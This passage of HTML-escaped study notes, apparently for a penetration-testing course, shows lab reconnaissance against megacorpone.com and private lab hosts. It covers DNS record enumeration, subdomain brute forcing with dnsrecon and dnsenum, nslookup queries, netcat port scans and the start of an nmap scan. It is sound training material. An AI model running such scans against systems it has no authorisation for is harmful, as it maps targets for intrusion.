-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;SOA&lt;/span&gt; &lt;span class="n"&gt;ns1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;79&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;37&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;18&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;NS&lt;/span&gt; &lt;span class="n"&gt;ns1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;79&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;37&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;18&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;NS&lt;/span&gt; &lt;span class="n"&gt;ns3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;66&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;70&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;207&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;180&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;NS&lt;/span&gt; &lt;span class="n"&gt;ns2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;39&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;63&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;MX&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;212&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;MX&lt;/span&gt; &lt;span class="n"&gt;spool&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="n"&gt;217&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;70&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;178&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;MX&lt;/span&gt; &lt;span class="n"&gt;fb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="n"&gt;217&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;70&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;178&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;217&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;MX&lt;/span&gt; &lt;span class="n"&gt;fb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="n"&gt;217&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;70&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;178&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;216&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;MX&lt;/span&gt; &lt;span class="n"&gt;fb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="n"&gt;217&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;70&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;178&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;215&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;MX&lt;/span&gt; &lt;span class="n"&gt;mail2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;213&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="k"&gt;Try&lt;/span&gt; &lt;span class="n"&gt;Harder&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;google-site&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;
-&lt;span class="n"&gt;verification&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="n"&gt;U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Enumerating&lt;/span&gt; &lt;span class="n"&gt;SRV&lt;/span&gt; &lt;span class="n"&gt;Records&lt;/span&gt;
-&lt;span class="p"&gt;[+]&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="n"&gt;Records&lt;/span&gt; &lt;span class="n"&gt;Found&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;cat &lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
-&lt;span class="n"&gt;www&lt;/span&gt;
-&lt;span class="n"&gt;ftp&lt;/span&gt;
-&lt;span class="n"&gt;mail&lt;/span&gt;
-&lt;span class="n"&gt;owa&lt;/span&gt;
-&lt;span class="n"&gt;proxy&lt;/span&gt;
-&lt;span class="n"&gt;router&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;dnsrecon&lt;/span&gt; &lt;span class="n"&gt;-d&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-D&lt;/span&gt; &lt;span class="p"&gt;~/&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="n"&gt;-t&lt;/span&gt; &lt;span class="n"&gt;brt&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Using&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;dictionary&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;kali&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;provided&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;brt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Performing&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;subdomain&lt;/span&gt; &lt;span class="n"&gt;brute&lt;/span&gt; &lt;span class="n"&gt;force&lt;/span&gt; &lt;span class="n"&gt;against&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
-&lt;span class="p"&gt;[+]&lt;/span&gt;   &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;149&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;56&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;244&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;87&lt;/span&gt;
-&lt;span class="p"&gt;[+]&lt;/span&gt;   &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;212&lt;/span&gt;
-&lt;span class="p"&gt;[+]&lt;/span&gt;   &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;214&lt;/span&gt;
-&lt;span class="p"&gt;[+]&lt;/span&gt; &lt;span class="n"&gt;3&lt;/span&gt; &lt;span class="n"&gt;Records&lt;/span&gt; &lt;span class="n"&gt;Found&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;dnsenum&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="p"&gt;...&lt;/span&gt;
-&lt;span class="n"&gt;dnsenum&lt;/span&gt; &lt;span class="n"&gt;VERSION&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;6&lt;/span&gt;
-&lt;span class="p"&gt;-----&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="p"&gt;-----&lt;/span&gt;
-&lt;span class="p"&gt;...&lt;/span&gt;
-&lt;span class="n"&gt;Brute&lt;/span&gt; &lt;span class="n"&gt;forcing&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dnsenum&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-&lt;span class="n"&gt;_______________________________________________&lt;/span&gt;
-&lt;span class="n"&gt;admin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;   &lt;span class="n"&gt;5&lt;/span&gt;     &lt;span class="k"&gt;IN&lt;/span&gt;       &lt;span class="n"&gt;A&lt;/span&gt;              &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;208&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;student&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;nslookup&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorptwo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;DNS&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt; &lt;span class="n"&gt;timed&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;timeout&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;2&lt;/span&gt; &lt;span class="n"&gt;seconds&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;UnKnown&lt;/span&gt;
-&lt;span class="n"&gt;Address&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;student&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;nslookup&lt;/span&gt; &lt;span class="n"&gt;-type&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="n"&gt;TXT&lt;/span&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorptwo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt;
-&lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;UnKnown&lt;/span&gt;
-&lt;span class="n"&gt;Address&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt;
-&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorptwo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt;
-&lt;span class="s2"&gt;&amp;quot;greetings from the TXT record body&amp;quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;TC/UDP Scanning&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nc&lt;/span&gt; &lt;span class="n"&gt;-nvv&lt;/span&gt; &lt;span class="n"&gt;-w&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="n"&gt;-z&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;152&lt;/span&gt; &lt;span class="n"&gt;3388&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;3390&lt;/span&gt;
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UNKNOWN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;152&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;3390&lt;/span&gt; &lt;span class="p"&gt;(?)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Connection&lt;/span&gt; &lt;span class="n"&gt;refused&lt;/span&gt;
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UNKNOWN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;152&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;3389&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ms-wbt-server&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UNKNOWN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;152&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;3388&lt;/span&gt; &lt;span class="p"&gt;(?)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Connection&lt;/span&gt; &lt;span class="n"&gt;refused&lt;/span&gt;
-&lt;span class="n"&gt;sent&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rcvd&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;![[Pasted image 20240202113027.png]]&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nc&lt;/span&gt; &lt;span class="n"&gt;-nv&lt;/span&gt; &lt;span class="n"&gt;-u&lt;/span&gt; &lt;span class="n"&gt;-z&lt;/span&gt; &lt;span class="n"&gt;-w&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt; &lt;span class="n"&gt;120&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;123&lt;/span&gt;
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UNKNOWN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;123&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ntp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;![[Pasted image 20240202113105.png]]&lt;/p&gt;
-&lt;h3&gt;Port Scanning with Nmap&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="n"&gt;-I&lt;/span&gt; &lt;span class="n"&gt;INPUT&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="n"&gt;-s&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt; &lt;span class="n"&gt;-j&lt;/span&gt; &lt;span class="n"&gt;ACCEPT&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="n"&gt;-I&lt;/span&gt; &lt;span class="n"&gt;OUTPUT&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="n"&gt;-d&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt; &lt;span class="n"&gt;-j&lt;/span&gt; &lt;span class="n"&gt;ACCEPT&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="n"&gt;-Z&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt;
-
